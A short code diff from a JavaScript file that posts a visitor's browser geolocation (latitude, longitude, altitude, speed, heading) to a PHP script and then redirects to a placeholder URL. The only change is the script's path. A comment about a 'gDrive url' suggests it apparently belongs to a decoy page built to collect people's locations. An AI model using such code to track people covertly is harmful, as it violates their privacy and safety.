@@ -24,7 +24,7 @@ function showPosition(position)
 // changing the gDrive url using success 
     $.ajax({
     type: 'POST',
-    url: '/php/result.php',
+    url: './php/result.php',
     data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
     success: function(){window.location='REDIRECT_URL';},
     mimeType: 'text'
